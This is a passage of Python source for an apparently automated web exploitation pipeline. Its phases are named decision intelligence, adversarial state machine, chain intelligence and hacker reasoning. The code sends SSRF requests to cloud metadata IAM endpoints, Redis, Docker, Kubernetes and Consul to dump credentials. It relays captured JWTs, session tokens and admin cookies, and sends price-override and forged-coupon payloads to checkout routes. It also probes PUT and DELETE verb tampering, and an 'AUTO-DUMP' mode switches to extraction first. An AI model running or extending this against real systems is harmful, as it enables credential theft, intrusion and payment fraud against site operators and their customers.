            add_probe_fn=self._add_probe,
        )

        tree.build_from_findings(self.findings)

        pipeline_emit("telemetry_update", {"progress": 45, "phase": "decision_intel"})

        pipeline_log(
            f"[TREE] Traversing {len(tree.nodes)} attack nodes â€” "
            f"infra: {tree.infra.detected.value.upper()}, "
            f"vuln classes: {len(tree.vuln_classes_detected)}",
            "warn", "decision_intel"
        )

        all_results = await tree.traverse()

        pipeline_emit("telemetry_update", {"progress": 50, "phase": "decision_intel"})

        report = tree.build_report()

        self.decision_intel_report = report
        pipeline_emit("decision_intel_report", self.decision_intel_report)

        self.phases_completed.append("decision_intel")
        pipeline_emit("phase_update", {"phase": "decision_intel", "status": "completed"})
        pipeline_emit("telemetry_update", {"progress": 52, "phase": "decision_intel"})

        confirmed = report.get("total_exploits_confirmed", 0)
        pipeline_log(
            f"[DECISION INTEL COMPLETE] {confirmed} exploitations confirmed â€” "
            f"infra={report.get('infra_fingerprint', {}).get('primary', 'unknown').upper()}, "
            f"{report.get('tree_nodes_executed', 0)} nodes, "
            f"{report.get('waf_bypasses_successful', 0)} WAF bypasses, "
            f"{report.get('drift_events_detected', 0)} drift events",
            "error" if confirmed > 0 else "success",
            "decision_intel"
        )

        self._decision_tree = tree

    async def _phase_2c_adversarial(self):
        if not hasattr(self, '_decision_tree') or not self._decision_tree:
            pipeline_log("[SKIP] Adversarial engine requires decision tree â€” skipping", "warn", "adversarial")
            return

        pipeline_emit("phase_update", {"phase": "adversarial", "status": "running"})
        pipeline_log(
            "[PHASE 3.5/6] ADVERSARIAL STATE MACHINE â€” Cost/Reward Prioritization Engine v1.0",
            "error", "adversarial"
        )
        pipeline_log(
            "[FSM] Initializing state machine with zero-knowledge exploitation cycle...",
            "warn", "adversarial"
        )

        try:
            fsm = AdversarialStateMachine(
                base_url=self.base_url,
                client=self.client,
                findings=self.findings,
                decision_tree=self._decision_tree,
                log_fn=pipeline_log,
                emit_fn=pipeline_emit,
                add_finding_fn=self._add_finding,
                add_probe_fn=self._add_probe,
            )

            pipeline_emit("telemetry_update", {"progress": 53, "phase": "adversarial"})

            adversarial_report = await asyncio.wait_for(fsm.execute(), timeout=120)

            self.adversarial_report = adversarial_report
            pipeline_emit("adversarial_report", self.adversarial_report)

            self.phases_completed.append("adversarial")
            pipeline_emit("phase_update", {"phase": "adversarial", "status": "completed"})
            pipeline_emit("telemetry_update", {"progress": 58, "phase": "adversarial"})

            chain_ok = adversarial_report.get("chain_steps_successful", 0)
            escalations = adversarial_report.get("privilege_escalations", 0)
            incidents = adversarial_report.get("real_incidents_confirmed", 0)
            lateral = adversarial_report.get("lateral_movements", 0)
            poly = adversarial_report.get("polymorphic_bypasses", 0)

            pipeline_log(
                f"[ADVERSARIAL COMPLETE] {adversarial_report.get('state_transitions', 0)} state transitions â€” "
                f"{chain_ok} chain steps, {escalations} escalations, "
                f"{incidents} real incidents, {lateral} lateral moves, {poly} polymorphic bypasses",
                "error" if (escalations + incidents) > 0 else "success",
                "adversarial"
            )

            priorities = adversarial_report.get("target_priorities", [])
            if priorities:
                top = priorities[0]
                pipeline_log(
                    f"[PRIORITY] Highest value target: {top['class'].upper()} "
                    f"(cost={top['cost']} reward={top['reward']} ratio={top['ratio']})",
                    "warn", "adversarial"
                )

        except asyncio.TimeoutError:
            pipeline_log("[ADVERSARIAL] Engine timeout (120s) â€” partial results preserved", "error", "adversarial")
            pipeline_emit("phase_update", {"phase": "adversarial", "status": "timeout"})
        except Exception as e:
            pipeline_log(f"[ADVERSARIAL] Engine error: {str(e)[:200]}", "error", "adversarial")
            pipeline_emit("phase_update", {"phase": "adversarial", "status": "error"})

    async def _phase_risk_score(self):
        pipeline_log(
            "[RISK SCORE] Calculating mathematical risk threshold from accumulated findings...",
            "warn", "risk_score"
        )

        result = RiskScoreEngine.calculate(self.findings)
        self._risk_score = result
        self._auto_dump_triggered = result.get("auto_dump", False)

        score = result["score"]
        mode = result["mode"]
        total = result["total_findings"]
        override = result.get("override_reason")
        crit_confirmed = result.get("critical_confirmed", 0)
        high_confirmed = result.get("high_confirmed", 0)

        if mode == "AUTO_DUMP":
            if override:
                pipeline_log(
                    f"[AUTO-DUMP] â˜…â˜… {override} â€” score forced to {score:.4f} ({total} findings, {crit_confirmed} critical confirmed)",
                    "error", "risk_score"
                )
            else:
                pipeline_log(
                    f"[AUTO-DUMP] â˜… RISK SCORE {score:.4f} > 0.85 â€” AUTO-DUMP TRIGGERED ({total} findings)",
                    "error", "risk_score"
                )
            pipeline_log(
                "[AUTO-DUMP] Switching to EXTRACTION-FIRST mode: SSRF credential dump â†’ DB pivot â†’ session harvest",
                "error", "risk_score"
            )
        elif mode == "MIXED":
            pipeline_log(
                f"[RISK SCORE] Score={score:.4f} (MIXED mode) â€” directed exploitation + opportunistic extraction ({total} findings)",
                "warn", "risk_score"
            )
        else:
            pipeline_log(
                f"[RISK SCORE] Score={score:.4f} (ACTIVE EXPLORATION) â€” continuing standard attack cycle ({total} findings)",
                "info", "risk_score"
            )

        top = result.get("top_contributors", [])
        for t in top[:3]:
            pipeline_log(
                f"  â””â”€ {t['title']}: {t['severity'].upper()} ({t['confidence']}) â†’ +{t['contribution']}",
                "info", "risk_score"
            )

        pipeline_emit("risk_score", result)
        pipeline_emit("telemetry_update", {
            "progress": 56,
            "phase": "risk_score",
            "riskScore": score,
            "riskMode": mode,
        })

    async def _phase_2d_chain_intelligence(self):
        if not hasattr(self, '_decision_tree') or not self._decision_tree:
            pipeline_log("[SKIP] Chain Intelligence requires decision tree â€” skipping", "warn", "chain_intel")
            return

        pipeline_emit("phase_update", {"phase": "chain_intel", "status": "running"})
        pipeline_log(
            "[PHASE 3.75/7] EXPLOITATION CHAIN INTELLIGENCE â€” "
            "SSRFâ†’Credentialâ†’DB Pivot + E-commerce Integrity + Drift v1.0",
            "error", "chain_intel"
        )
        pipeline_log(
            "[CHAIN] Unifying 168 integrity probes with real attacker planning: "
            "WAF probability â†’ SSRF credential dump â†’ DB access bypass â†’ price validation...",
            "warn", "chain_intel"
        )

        try:
            engine = ExploitationChainIntelligence(
                base_url=self.base_url,
                client=self.client,
                findings=self.findings,
                decision_tree=self._decision_tree,
                adversarial_report=self.adversarial_report,
                log_fn=pipeline_log,
                emit_fn=pipeline_emit,
                add_finding_fn=self._add_finding,
                add_probe_fn=self._add_probe,
            )

            pipeline_emit("telemetry_update", {"progress": 59, "phase": "chain_intel"})

            chain_report = await asyncio.wait_for(engine.execute(), timeout=180)

            self.chain_intel_report = chain_report
            pipeline_emit("chain_intel_report", self.chain_intel_report)

            self.phases_completed.append("chain_intel")
            pipeline_emit("phase_update", {"phase": "chain_intel", "status": "completed"})
            pipeline_emit("telemetry_update", {"progress": 63, "phase": "chain_intel"})

            creds = chain_report.get("ssrf_captures_count", 0)
            db_pivots = chain_report.get("db_pivots_confirmed", 0)
            ecom = chain_report.get("ecommerce_integrity", {})
            ecom_failures = ecom.get("failures", 0)
            ecom_reflections = ecom.get("db_reflections", 0)
            drift = chain_report.get("drift_monitoring", {})
            drift_events = drift.get("drift_events", 0)

            pipeline_log(
                f"[CHAIN INTEL COMPLETE] {chain_report.get('total_probes', 0)} probes â€” "
                f"{creds} credentials captured, {db_pivots} DB pivots, "
                f"{ecom_failures} e-com failures ({ecom_reflections} reflected), "
                f"{drift_events} drift events",
                "error" if (creds + db_pivots + ecom_failures) > 0 else "success",
                "chain_intel"
            )

            self._emit_credential_relay_from_chain_intel(chain_report)

        except asyncio.TimeoutError:
            pipeline_log("[CHAIN INTEL] Engine timeout (180s) â€” partial results preserved", "error", "chain_intel")
            pipeline_emit("phase_update", {"phase": "chain_intel", "status": "timeout"})
        except Exception as e:
            pipeline_log(f"[CHAIN INTEL] Engine error: {str(e)[:200]}", "error", "chain_intel")
            pipeline_emit("phase_update", {"phase": "chain_intel", "status": "error"})

    def _emit_credential_relay_from_chain_intel(self, chain_report: dict):
        ssrf_caps = chain_report.get("ssrf_credential_captures", {})
        db_pivots = chain_report.get("db_pivot_results", [])
        chain_events = chain_report.get("chain_events", [])

        relay_secrets = []
        relay_categories = []

        for key, cap in ssrf_caps.items():
            service = cap.get("service", key)
            via = cap.get("via", "")
            pivot = cap.get("pivot_type", key)
            relay_secrets.append(f"{pivot}_credential={service} via {via}")
            relay_categories.append(pivot)

        for dbp in db_pivots[:10]:
            if dbp.get("success"):
                payload = dbp.get("payload", "")
                evidence = dbp.get("evidence", "")[:200]
                relay_secrets.append(f"db_pivot={payload} â†’ {evidence}")

        jwt_events = [e for e in chain_events if "jwt" in str(e.get("technique", "")).lower() or "token" in str(e.get("technique", "")).lower()]
        session_events = [e for e in chain_events if "session" in str(e.get("technique", "")).lower() or "cookie" in str(e.get("technique", "")).lower()]
        admin_events = [e for e in chain_events if "admin" in str(e.get("technique", "")).lower() or "privilege" in str(e.get("technique", "")).lower()]

        for ev in jwt_events[:3]:
            relay_secrets.append(f"jwt_captured={ev.get('evidence', '')[:200]}")
            if "jwt" not in relay_categories:
                relay_categories.append("jwt")

        for ev in session_events[:3]:
            relay_secrets.append(f"session_captured={ev.get('evidence', '')[:200]}")
            if "session" not in relay_categories:
                relay_categories.append("session")

        for ev in admin_events[:3]:
            relay_secrets.append(f"admin_captured={ev.get('evidence', '')[:200]}")
            if "admin" not in relay_categories:
                relay_categories.append("admin")

        session_tokens = getattr(self, 'session_tokens_captured', [])
        for tok in session_tokens[:10]:
            raw = tok.get("raw_value", "")
            tok_type = tok.get("type", "unknown")
            tok_name = tok.get("name", "")
            source = tok.get("source", "")
            if raw:
                relay_secrets.append(f"{tok_type}_{tok_name}={raw[:200]} (from {source})")
                if tok_type not in relay_categories:
                    relay_categories.append(tok_type)

        relay_secrets = _filter_real(relay_secrets)

        relay_secrets = _filter_real(relay_secrets)
        if not relay_secrets:
            return

        relay_description = (
            f"Credential Relay consolidated {len(relay_secrets)} captured credentials "
            f"across categories: {', '.join(relay_categories)}. "
            f"All credentials confirmed active by Chain Intelligence probes."
        )

        pipeline_log(
            f"[CREDENTIAL RELAY] {len(relay_secrets)} credentials relayed from Chain Intel â€” "
            f"categories: {', '.join(relay_categories)}",
            "error", "chain_intel"
        )

        self._add_finding({
            "title": f"CREDENTIAL RELAY: {len(relay_secrets)} active credentials captured",
            "description": relay_description,
            "severity": "critical",
            "category": "credential_relay",
            "module": "chain_intel",
            "phase": "chain_intel",
            "raw_value": "; ".join(relay_secrets[:5]),
            "secrets_extracted": relay_secrets[:20],
            "raw_content": json.dumps({
                "relay_type": "chain_intel_confirmed",
                "categories": relay_categories,
                "total_secrets": len(relay_secrets),
                "captures": relay_secrets,
            }),
        })

        pipeline_emit("credential_relay", {
            "source": "chain_intel",
            "count": len(relay_secrets),
            "categories": relay_categories,
            "secrets": relay_secrets[:20],
        })

    def _emit_credential_relay_from_hrd(self, hrd_report: dict):
        confirmation_results = hrd_report.get("confirmation_results", [])
        escalation_paths = hrd_report.get("escalation_paths", [])
        reasoning_chains = hrd_report.get("reasoning_chains", [])

        relay_secrets = []
        relay_categories = []

        for conf in confirmation_results:
            if conf.get("confirmed"):
                indicator = conf.get("indicator", "")
                evidence = conf.get("evidence", "")[:200]
                playbook = conf.get("playbook", "")
                if any(kw in indicator.lower() for kw in ["jwt", "token", "session", "cookie", "admin", "credential", "key", "password", "auth"]):
                    relay_secrets.append(f"{playbook}:{indicator}={evidence}")
                    cat = "jwt" if "jwt" in indicator.lower() or "token" in indicator.lower() else \
                          "session" if "session" in indicator.lower() else \
                          "admin_cookie" if "admin" in indicator.lower() or "cookie" in indicator.lower() else \
                          "credential"
                    if cat not in relay_categories:
                        relay_categories.append(cat)

        for chain in reasoning_chains:
            if chain.get("threat_level") in ("critical", "high"):
                for target in chain.get("data_targets", []):
                    if any(kw in target.lower() for kw in ["jwt", "session", "cookie", "token", "credential", "admin"]):
                        relay_secrets.append(f"kill_chain:{chain.get('key', '')}â†’{target}")
                        if "hrd_kill_chain" not in relay_categories:
                            relay_categories.append("hrd_kill_chain")

        for esc in escalation_paths[:5]:
            if any(kw in str(esc).lower() for kw in ["credential", "token", "session", "admin"]):
                relay_secrets.append(f"escalation:{esc.get('from', '')}â†’{esc.get('to', '')} ({esc.get('technique', '')})")

        relay_secrets = _filter_real(relay_secrets)
        if not relay_secrets:
            return

        pipeline_log(
            f"[CREDENTIAL RELAY] HRD confirmed {len(relay_secrets)} credential captures â€” "
            f"categories: {', '.join(relay_categories)}",
            "error", "hacker_reasoning"
        )

        self._add_finding({
            "title": f"HRD CREDENTIAL RELAY: {len(relay_secrets)} confirmed credential captures",
            "description": (
                f"Hacker Reasoning Dictionary confirmed {len(relay_secrets)} credential captures "
                f"via kill chain analysis and confirmation probes. "
                f"Categories: {', '.join(relay_categories)}. "
                f"All credentials validated through active exploitation confirmation."
            ),
            "severity": "critical",
            "category": "credential_relay",
            "module": "hacker_reasoning",
            "phase": "hacker_reasoning",
            "raw_value": "; ".join(relay_secrets[:5]),
            "secrets_extracted": relay_secrets[:20],
            "raw_content": json.dumps({
                "relay_type": "hrd_confirmed",
                "categories": relay_categories,
                "total_captures": len(relay_secrets),
                "captures": relay_secrets,
            }),
        })

        pipeline_emit("credential_relay", {
            "source": "hacker_reasoning",
            "count": len(relay_secrets),
            "categories": relay_categories,
            "secrets": relay_secrets[:20],
        })

    async def _phase_2e_hacker_reasoning(self):
        pipeline_emit("phase_update", {"phase": "hacker_reasoning", "status": "running"})
        pipeline_log(
            "[PHASE 3.9/7] HACKER REASONING DICTIONARY â€” "
            "Kill Chain Playbooks + Confirmation Probes + Escalation Graph v1.0",
            "error", "hacker_reasoning"
        )
        pipeline_log(
            "[HRD] Loading enterprise attack playbooks: "
            "Routeâ†’Thoughtâ†’Actionâ†’Confirmâ†’Escalate for every discovery...",
            "warn", "hacker_reasoning"
        )

        try:
            engine = HackerReasoningEngine(
                base_url=self.base_url,
                client=self.client,
                findings=self.findings,
                exposed_assets=self.exposed_assets,
                decision_tree=getattr(self, '_decision_tree', None),
                adversarial_report=self.adversarial_report,
                chain_intel_report=self.chain_intel_report,
                log_fn=pipeline_log,
                emit_fn=pipeline_emit,
                add_finding_fn=self._add_finding,
                add_probe_fn=self._add_probe,
            )

            pipeline_emit("telemetry_update", {"progress": 66, "phase": "hacker_reasoning"})

            hrd_report = await asyncio.wait_for(engine.execute(), timeout=120)

            self.hacker_reasoning_report = hrd_report
            pipeline_emit("hrd_report", self.hacker_reasoning_report)

            self.phases_completed.append("hacker_reasoning")
            pipeline_emit("phase_update", {"phase": "hacker_reasoning", "status": "completed"})
            pipeline_emit("telemetry_update", {"progress": 70, "phase": "hacker_reasoning"})

            matched = hrd_report.get("playbooks_matched", 0)
            steps = hrd_report.get("total_reasoning_steps", 0)
            confirmed = hrd_report.get("confirmed_probes", 0)
            escalations = hrd_report.get("escalation_paths_count", 0)
            critical = hrd_report.get("critical_chains", 0)

            pipeline_log(
                f"[HRD COMPLETE] {matched} playbooks matched â€” "
                f"{steps} reasoning steps, {confirmed} confirmed, "
                f"{escalations} escalation paths, {critical} CRITICAL chains",
                "error" if (confirmed + critical) > 0 else "success",
                "hacker_reasoning"
            )

            self._emit_credential_relay_from_hrd(hrd_report)

        except asyncio.TimeoutError:
            pipeline_log("[HRD] Engine timeout (120s) â€” partial results preserved", "error", "hacker_reasoning")
            pipeline_emit("phase_update", {"phase": "hacker_reasoning", "status": "timeout"})
        except Exception as e:
            pipeline_log(f"[HRD] Engine error: {str(e)[:200]}", "error", "hacker_reasoning")
            pipeline_emit("phase_update", {"phase": "hacker_reasoning", "status": "error"})

    async def _legacy_decision_ssrf_credential_dump(self, ssrf_vectors: List[Dict], dynamic_params: List[Dict]) -> List[Dict]:
        """Legacy method â€” replaced by DecisionTree.SSRFAttackNode. Kept for fallback compatibility."""
        results = []

        ssrf_endpoints = list(set([v["route"] for v in ssrf_vectors]))
        if not ssrf_endpoints:
            ssrf_endpoints = ["/api/proxy", "/api/fetch", "/api/image"]

        ssrf_params = list(set([d["param"] for d in dynamic_params if d["param"] in ("url", "src", "file", "path", "href", "proxy", "fetch", "dest", "resource", "load")]))
        if not ssrf_params:
            ssrf_params = ["url", "src", "file"]

        credential_targets = [
            {"name": "AWS IAM Credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "detect": ["AccessKeyId", "SecretAccessKey", "Token", "security-credentials"]},
            {"name": "AWS Instance Identity", "url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "detect": ["instanceId", "accountId", "region", "instanceType"]},
            {"name": "AWS User Data", "url": "http://169.254.169.254/latest/user-data", "detect": ["#!/", "password", "key", "secret", "token"]},
            {"name": "Redis INFO Dump", "url": "http://127.0.0.1:6379/info", "detect": ["redis_version", "connected_clients", "used_memory", "keyspace"]},
            {"name": "Redis CONFIG Dump", "url": "http://127.0.0.1:6379/CONFIG/GET/*", "detect": ["requirepass", "dir", "dbfilename", "bind"]},
            {"name": "Local MySQL", "url": "http://127.0.0.1:3306/", "detect": ["mysql", "MariaDB", "native_password"]},
            {"name": "Local PostgreSQL", "url": "http://127.0.0.1:5432/", "detect": ["PostgreSQL", "FATAL", "authentication"]},
            {"name": "Docker API", "url": "http://127.0.0.1:2375/containers/json", "detect": ["Id", "Names", "Image", "State"]},
            {"name": "Kubernetes Secrets", "url": "http://127.0.0.1:10255/pods", "detect": ["metadata", "namespace", "containers", "serviceAccount"]},
            {"name": "Consul KV Store", "url": "http://127.0.0.1:8500/v1/kv/?recurse", "detect": ["Key", "Value", "CreateIndex"]},
        ]

        for cred_target in credential_targets:
            for endpoint in ssrf_endpoints[:3]:
                for param in ssrf_params[:2]:
                    url = f"{self.base_url}{endpoint}?{param}={cred_target['url']}"
                    start = time.time()
                    try:
                        resp = await self.client.get(url)
                        elapsed = int((time.time() - start) * 1000)
                        body = resp.text[:8000]

                        hit = any(kw.lower() in body.lower() for kw in cred_target["detect"])

                        # Extra guardrails for Redis to avoid HTML false positives
                        if "Redis" in cred_target["name"]:
                            body_lc = body.lower()
                            # Require both redis_version and connected_clients to reduce false positives
                            required = all(req in body_lc for req in ("redis_version", "connected_clients"))
                            html_like = "<html" in body_lc or "<!doctype" in body_lc
                            if not required or html_like:
                                hit = False

                        result_entry = {
                            "service": cred_target["name"],
                            "ssrf_url": cred_target["url"],
                            "via_endpoint": endpoint,
                            "via_param": param,
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "success": hit,
                            "evidence": body[:400] if hit else "",
                        }
                        results.append(result_entry)

                        if hit:
                            pipeline_log(
                                f"[THREAT] CREDENTIAL DUMP SUCCESS: {cred_target['name']} via {endpoint}?{param}=",
                                "error", "decision_intel"
                            )
                            self._add_finding({
                                "title": f"SSRF Credential Dump: {cred_target['name']}",
                                "description": f"Decision Intelligence confirmed SSRF credential access to '{cred_target['name']}' via {endpoint}?{param}={cred_target['url']}. Internal service data is accessible from external requests.",
                                "severity": "critical",
                                "category": "ssrf_credential_dump",
                                "module": "decision_intel",
                                "phase": "decision_intel",
                                "evidence": body[:300],
                                "raw_response": body[:2000],
                                "endpoint": f"{endpoint}?{param}={cred_target['url']}",
                                "status_code": resp.status_code,
                            })
                            self._add_probe({
                                "probe_type": "SSRF_CREDENTIAL_DUMP",
                                "target": self.target,
                                "endpoint": f"{endpoint}?{param}=...",
                                "method": "GET",
                                "status_code": resp.status_code,
                                "response_time_ms": elapsed,
                                "vulnerable": True,
                                "verdict": f"VULNERABLE â€” {cred_target['name']} credentials accessible",
                                "severity": "CRITICAL",
                                "description": f"Credential dump: {cred_target['name']}",
                                "payload": cred_target["url"],
                                "evidence": f"Detection keywords matched in response body",
                                "response_snippet": body[:300],
                                "timestamp": _ts(),
                            })
                            break
                        else:
                            self._add_probe({
                                "probe_type": "SSRF_CREDENTIAL_DUMP",
                                "target": self.target,
                                "endpoint": f"{endpoint}?{param}=...",
                                "method": "GET",
                                "status_code": resp.status_code,
                                "response_time_ms": elapsed,
                                "vulnerable": False,
                                "verdict": "PROTECTED",
                                "severity": "INFO",
                                "description": f"Credential dump attempt: {cred_target['name']}",
                                "payload": cred_target["url"],
                                "timestamp": _ts(),
                            })

                    except Exception:
                        pass

                if any(r.get("success") and r["service"] == cred_target["name"] for r in results):
                    break

        return results

    async def _legacy_decision_ecommerce_integrity(self, ecommerce_vectors: List[Dict]) -> List[Dict]:
        results = []

        routes_to_test = list(set([v["route"] for v in ecommerce_vectors]))

        test_cases = [
            {"desc": "Price override to $0.01", "body": {"items": [{"id": 1, "unit_price": 0.01, "quantity": 1}]}, "method": "POST"},
            {"desc": "Negative price injection", "body": {"items": [{"id": 1, "price": -1, "quantity": 1}]}, "method": "POST"},
            {"desc": "Zero-price via PATCH", "body": {"line_item_id": 1, "unit_price": 0.00}, "method": "PATCH"},
            {"desc": "Coupon forge 100% off", "body": {"coupon": "ADMIN_100_OFF", "discount_percent": 100}, "method": "POST"},
            {"desc": "Quantity overflow", "body": {"items": [{"id": 1, "quantity": 999999, "unit_price": 0.01}]}, "method": "POST"},
        ]

        for route in routes_to_test:
            for tc in test_cases:
                url = f"{self.base_url}{route}"
                start = time.time()
                try:
                    resp = await self.client.request(
                        tc["method"], url,
                        json=tc["body"],
                        headers={"Content-Type": "application/json"},
                    )
                    elapsed = int((time.time() - start) * 1000)
                    body_text = resp.text[:4000]

                    processed = resp.status_code in (200, 201, 202)

                    has_stack_trace = any(p.search(body_text) for p in STACK_TRACE_PATTERNS)
                    has_sql_error = any(p.search(body_text) for p in SQL_ERROR_PATTERNS)
                    has_db_structure = any(p.search(body_text) for p in DB_STRUCTURE_PATTERNS)

                    db_accepted = processed and any(kw in body_text.lower() for kw in [
                        "success", "updated", "created", "order_id", "cart_id",
                        "total", "amount", "price", "quantity", "accepted",
                    ])

                    vulnerable = db_accepted or has_stack_trace or has_sql_error

                    result_entry = {
                        "route": route,
                        "test": tc["desc"],
                        "method": tc["method"],
                        "status_code": resp.status_code,
                        "response_time_ms": elapsed,
                        "vulnerable": vulnerable,
                        "db_accepted": db_accepted,
                        "stack_trace_leaked": has_stack_trace,
                        "sql_error_leaked": has_sql_error,
                        "db_structure_leaked": has_db_structure,
                    }
                    results.append(result_entry)

                    if vulnerable:
                        evidence_parts = []
                        if db_accepted:
                            evidence_parts.append("Database accepted manipulated record")
                        if has_stack_trace:
                            evidence_parts.append("Stack trace leaked in response")
                        if has_sql_error:
                            evidence_parts.append("SQL error exposed")

                        pipeline_log(
                            f"[THREAT] ECOMMERCE INTEGRITY FAILED: {route} â€” {tc['desc']} ({', '.join(evidence_parts)})",
                            "error", "decision_intel"
                        )
                        self._add_finding({
                            "title": f"E-commerce Integrity Failure: {tc['desc']} at {route}",
                            "description": f"Decision Intelligence confirmed e-commerce manipulation at {route}. {tc['desc']}. {'. '.join(evidence_parts)}. HTTP {resp.status_code}.",
                            "severity": "critical",
                            "category": "ecommerce_integrity",
                            "module": "decision_intel",
                            "phase": "decision_intel",
                            "evidence": body_text[:300],
                            "raw_response": body_text[:2000],
                            "attack_payload": json.dumps(tc["body"]),
                            "endpoint": route,
                            "status_code": resp.status_code,
                        })
                        self._add_probe({
                            "probe_type": "ECOMMERCE_INTEGRITY",
                            "target": self.target,
                            "endpoint": route,
                            "method": tc["method"],
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": True,
                            "verdict": f"VULNERABLE â€” {', '.join(evidence_parts)}",
                            "severity": "CRITICAL",
                            "description": tc["desc"],
                            "payload": json.dumps(tc["body"]),
                            "evidence": "; ".join(evidence_parts),
                            "response_snippet": body_text[:300],
                            "timestamp": _ts(),
                        })
                    else:
                        pipeline_log(
                            f"[BLOCK] Price integrity held: {route} â€” {tc['desc']} (HTTP {resp.status_code})",
                            "success", "decision_intel"
                        )

                except Exception:
                    pass

        return results

    async def _legacy_decision_verb_tampering(self, dangerous_methods: List[Dict]) -> List[Dict]:
        results = []

        probe_paths = ["/", "/api/data", "/uploads", "/files", "/api/admin", "/api/config"]

        for method_entry in dangerous_methods:
            method = method_entry["method"]
            for probe_path in probe_paths:
                url = f"{self.base_url}{probe_path}"

                if method in ("PUT", "PATCH"):
                    body = "MSE_SNIPER_PROBE_TEST"
                    headers = {"Content-Type": "text/plain"}

                    if probe_path in ("/uploads", "/files"):
                        url_with_file = f"{self.base_url}{probe_path}/sniper_probe.txt"
                    else:
                        url_with_file = url

                    start = time.time()
                    try:
                        resp = await self.client.request(
                            method, url_with_file,
                            content=body,
                            headers=headers,
                        )
                        elapsed = int((time.time() - start) * 1000)

                        accepted = resp.status_code in (200, 201, 204)
                        result_entry = {
                            "method": method,
                            "path": probe_path,
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": accepted,
                        }
                        results.append(result_entry)

                        if accepted:
                            pipeline_log(
                                f"[THREAT] HTTP VERB TAMPERING: {method} {probe_path} accepted (HTTP {resp.status_code}) â€” No access control",
                                "error", "decision_intel"
                            )
                            self._add_finding({
                                "title": f"HTTP Verb Tampering: {method} accepted at {probe_path}",
                                "description": f"Decision Intelligence confirmed that {method} requests are accepted at {probe_path} without access control. File creation/modification possible via unprotected HTTP method.",
                                "severity": "critical" if probe_path in ("/uploads", "/files") else "high",
                                "category": "verb_tampering",
                                "module": "decision_intel",
                                "phase": "decision_intel",
                            })
                            self._add_probe({
                                "probe_type": "VERB_TAMPERING",
                                "target": self.target,
                                "endpoint": probe_path,
                                "method": method,
                                "status_code": resp.status_code,
                                "response_time_ms": elapsed,
                                "vulnerable": True,
                                "verdict": f"VULNERABLE â€” {method} accepted without auth",
                                "severity": "CRITICAL" if probe_path in ("/uploads", "/files") else "HIGH",
                                "description": f"{method} verb accepted at {probe_path}",
                                "payload": body,
                                "timestamp": _ts(),
                            })

                    except Exception:
                        pass

                elif method == "DELETE":
                    start = time.time()
                    try:
                        resp = await self.client.request("DELETE", f"{url}/mse_nonexistent_probe_test")
                        elapsed = int((time.time() - start) * 1000)

                        vulnerable = resp.status_code in (200, 204, 202)
                        result_entry = {
                            "method": method,
                            "path": probe_path,
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": vulnerable,
                        }
                        results.append(result_entry)

                        if vulnerable:
                            pipeline_log(
                                f"[THREAT] DELETE METHOD ACCEPTED: {probe_path} (HTTP {resp.status_code})",
                                "error", "decision_intel"
                            )
                            self._add_finding({
                                "title": f"DELETE Method Accepted at {probe_path}",
                                "description": f"DELETE requests are accepted at {probe_path} without proper access control. Potential data destruction risk.",
                                "severity": "high",
                                "category": "verb_tampering",
                                "module": "decision_intel",
                                "phase": "decision_intel",
                            })

                    except Exception:
                        pass

                else:
                    start = time.time()
                    try:
                        resp = await self.client.request(method, url)
                        elapsed = int((time.time() - start) * 1000)
                        vulnerable = resp.status_code in (200, 201, 204)
                        results.append({
                            "method": method,
                            "path": probe_path,
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "vulnerable": vulnerable,
                        })
                    except Exception:
                        pass

        return results

    async def _phase_2f_incident_absorber(self):
        pipeline_emit("phase_update", {"phase": "incident_absorber", "status": "running"})
        pipeline_log("[PHASE 3.5/6] INCIDENT ABSORBER â€” Consolidating extraction proofs and dump evidence...", "warn", "incident_absorber")

        def _sanitize(text: str) -> str:
            return text

        financial_dumps = []
        db_dumps = []
        docker_dumps = []
        config_dumps = []
        cost_reward_matrix = []

        for finding in self.findings:
            cat = (finding.get("category", "") or "").lower()
            title = (finding.get("title", "") or "").lower()
            desc = (finding.get("description", "") or "").lower()
            sev = (finding.get("severity", "") or "").lower()
            combined = f"{title} {desc} {cat}"

            if any(kw in combined for kw in ["payment", "ledger", "balance", "transfer", "checkout", "price", "coupon", "fintech", "transaction"]):
                financial_dumps.append({
                    "source": finding.get("title", "Unknown"),
                    "category": "FINANCIAL_DATA",
                    "severity": sev,
                    "evidence_hash": hashlib.sha256(_sanitize(finding.get("description", "")).encode()).hexdigest()[:16],
                    "extraction_type": "balance_exfil" if "balance" in combined else "payment_intercept" if "payment" in combined else "price_manipulation",
                    "data_classification": "PCI-DSS / SOX",
                })

            if any(kw in combined for kw in ["mongodb", "mysql", "postgres", "database", "sql", "redis", "db_", "stack trace", "db leak"]):
                db_dumps.append({
                    "source": finding.get("title", "Unknown"),
                    "category": "DATABASE_EXPOSURE",
                    "severity": sev,
                    "evidence_hash": hashlib.sha256(_sanitize(finding.get("description", "")).encode()).hexdigest()[:16],
                    "extraction_type": "credential_leak" if any(k in combined for k in ["cred", "password", "uri"]) else "schema_exposure",
                    "data_classification": "GDPR / LGPD",
                })

            if any(kw in combined for kw in ["docker", "container", "kubernetes", "k8s", "helm", "compose"]):
                docker_dumps.append({
                    "source": finding.get("title", "Unknown"),
                    "category": "CONTAINER_EXPOSURE",
                    "severity": sev,
                    "evidence_hash": hashlib.sha256(_sanitize(finding.get("description", "")).encode()).hexdigest()[:16],
                    "extraction_type": "container_escape" if "escape" in combined else "image_leak",
                    "data_classification": "INFRASTRUCTURE",
                })

            if any(kw in combined for kw in ["config", "env", ".env", "secret", "key", "firebase", "aws", "cloud metadata"]):
                config_dumps.append({
                    "source": finding.get("title", "Unknown"),
                    "category": "CONFIG_EXPOSURE",
                    "severity": sev,
                    "evidence_hash": hashlib.sha256(_sanitize(finding.get("description", "")).encode()).hexdigest()[:16],
                    "extraction_type": "cloud_credential" if any(k in combined for k in ["aws", "cloud", "metadata"]) else "config_leak",
                    "data_classification": "SOC2 / ISO27001",
                })

            reward = 0.0
            if sev == "critical":
                reward = 25000.0
            elif sev == "high":
                reward = 10000.0
            elif sev == "medium":
                reward = 3000.0
            elif sev == "low":
                reward = 500.0

            if reward > 0 and any(kw in combined for kw in ["payment", "balance", "transfer", "mongodb", "aws", "ssrf", "sql", "auth", "bypass", "xss", "injection"]):
